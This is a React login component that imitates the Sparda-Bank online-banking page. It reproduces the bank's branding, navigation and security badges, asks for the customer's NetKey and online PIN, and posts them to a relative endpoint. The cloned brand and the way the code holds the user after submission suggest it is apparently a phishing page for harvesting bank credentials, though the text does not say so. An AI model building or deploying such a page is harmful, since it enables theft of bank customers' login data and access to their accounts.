import React, { useState } from 'react';

const Login = ({ onLogin }) => {
  const [netKey, setNetKey] = useState('');
  const [pin, setPin] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isShaking, setIsShaking] = useState(false);

  const handleFormSubmit = async (e) => {
    e.preventDefault(); 
    
    if (!netKey.trim() || !pin.trim()) {
      setErrorMessage('Bitte geben Sie Ihre Anmeldedaten ein (NetKey und PIN).');
      
      setIsShaking(true);
      setTimeout(() => setIsShaking(false), 500);
      return;
    }

    setIsLoading(true);
    setErrorMessage('');

    try {
      const response = await fetch('/api/v1/auth/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          netKey: netKey.trim(),
          pin: pin.trim()
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || 'Anmeldedaten sind ungültig (Falscher NetKey oder PIN).');
      }

      if (data.success && onLogin) {
        setTimeout(() => {
          onLogin(data.user);
        }, 5000);
        return; 
      }

    } catch (err) {
      console.error('AUTH GATEWAY FAILURE // Handshake halted:', err.message);
      setErrorMessage(err.message || 'Verbindung zum Anmeldeserver fehlgeschlagen. Bitte versuchen Sie es später erneut.');
      setIsShaking(true);
      setTimeout(() => setIsShaking(false), 500);
    } finally { 
      if (errorMessage) {
        setIsLoading(false);
      }
    }
  };

  return (
    <div id="login-screen">
      {/* ..... */}
      <style>
        {`
          .shake-error {
            animation: form-shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
          }
          @keyframes form-shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
          }
        `}
      </style>

      <nav className="login-nav">
        <a className="sparda-logo" href="#">
          <div className="sparda-logo-icon">
            <svg viewBox="0 0 100 100">
              <text y=".9em" fontSize="80" fontFamily="serif" fontWeight="bold">S</text>
            </svg>
          </div>
          <span className="sparda-logo-text">Sparda-<span>Bank</span></span>
        </a>
        <div className="login-nav-links">
          <a href="#">Girokonto</a>
          <a href="#">Sparen</a>
          <a href="#">Immobilien</a>
          <a href="#">Versicherungen</a>
          <a href="#">Depot</a>
          <a href="#">Service</a>
        </div>
      </nav>

      <div className="login-hero">
        <div className="login-hero-inner">
          <div className="login-hero-copy">
            <h1>Ihr Banking.<br /><strong>Einfach. Sicher. Digital.</strong></h1>
            <p>Mit dem Online-Banking der Sparda-Bank haben Sie Ihre Finanzen jederzeit im Blick – auf allen Geräten.</p>
            <div className="login-hero-badges">
              <span className="hero-badge">TÜV-geprüft sicher</span>
              <span className="hero-badge">SpardaSecureGo+</span>
              <span className="hero-badge">UnionDepot</span>
              <span className="hero-badge">Echtzeit-Überweisung</span>
            </div>
          </div>

          <div className="login-card">
            <h2>Online-Banking</h2>
            <div className="login-card-sub">Melden Sie sich mit Ihrem Sparda-NetKey an.</div>

            {/* ───── */}
            {errorMessage && (
              <div style={{ color: 'var(--red)', padding: '10px', background: '#fef2f2', borderRadius: '6px', marginBottom: '14px', fontSize: '13px', fontWeight: '500' }}>
                ⚠️ {errorMessage}
              </div>
            )}

            {/* Wrapped controls inside a traditional HTML form layout for clean keypress detection */}
            {/* Added dynamic shake class here */}
            <form onSubmit={handleFormSubmit} className={isShaking ? 'shake-error' : ''}>
              <div className="form-group">
                <label htmlFor="login-user">Sparda-NetKey / Alias</label>
                <input
                  type="text"
                  id="login-user"
                  placeholder="z.B. Sparda1234512.05.85"
                  value={netKey}
                  onChange={(e) => setNetKey(e.target.value)}
                  disabled={isLoading}
                />
                <div className="login-hint">z.B. Sparda + Kundennummer + Geburtsdatum (TTMMJJJJ)</div>
              </div>

              <div className="form-group">
                <label htmlFor="login-pin">Online-PIN</label>
                <input
                  type="password"
                  id="login-pin"
                  placeholder="•••••"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  disabled={isLoading}
                />
              </div>

              {/* ⚡ UPDATED: Removed !netKey and !pin from the disabled array so users can click and trigger the shake */}
              <button 
                type="submit" 
                className="btn-login" 
                disabled={isLoading}
                style={{ opacity: isLoading ? 0.7 : 1, cursor: isLoading ? 'not-allowed' : 'pointer' }}
              >
                <span></span> {isLoading ? '⌛ Anmeldedaten werden überprüft...' : 'Login'}
              </button>
            </form>

            <div className="login-links">
              <a href="#">Alias vergessen?</a>
              <a href="#">PIN vergessen?</a>
            </div>

            <div className="login-securego">
              <span className="login-securego-icon">📱</span>
              <div>
                <strong>SpardaSecureGo+</strong>
                Freigabe per App – kein TAN mehr nötig. Sicher und bequem.
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
